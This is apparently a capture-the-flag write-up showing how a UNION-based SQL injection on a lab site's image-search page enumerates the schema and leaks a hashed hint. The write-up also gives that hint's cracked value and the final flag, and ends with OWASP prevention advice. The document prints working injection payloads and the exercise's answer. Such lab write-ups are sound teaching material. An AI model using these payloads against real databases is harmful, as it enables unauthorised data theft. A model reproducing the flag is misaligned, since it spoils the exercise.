ID: -1 UNION SELECT title, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?

## How we found the flag
By doing sql inject on the memebers page (/index.php?page=searchimg), we can find the database table schema, including table schema names, table names and column names.

### Find all column names on the image table

We are interested in finding all user information. First, we can find out database version with `1 UNION SELECT 1, version() limit 1,1`, the DB version is `5.5.64-MariaDB-1ubuntu0.14.04.1`.

> INFORMATION_SCHEMA provides access to database metadata (mysql), see [doc](https://dev.mysql.com/doc/refman/8.3/en/information-schema-table-reference.html).

Get all column names with `-1 UNION SELECT table_name, column_name FROM information_Schema.columns where table_schema=DATABASE()`, the table is called "list_images", and the avalaible columns are "id, url, title, comment".


### Look for information for exploiting
When trying `-1 UNION SELECT title, comment from list_images `, the output becomes interesting:

```
ID: -1 UNION SELECT title, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

### Follow the hint
Decrypt `1928e8083cf461a51303633093573c46` with https://www.dcode.fr/md5-hash, we get `albatroz`, then encrypt "albatroz" with sh256, the result is the flag `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`


## How to exploit the breach
- Get sensitive information from the database, modify or even delete entries.

## What's the correct way
[doc](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
> Stop writing dynamic queries with string concatenation.
> Prevent malicious SQL input from being included in executed queries with Parameterized Queries.
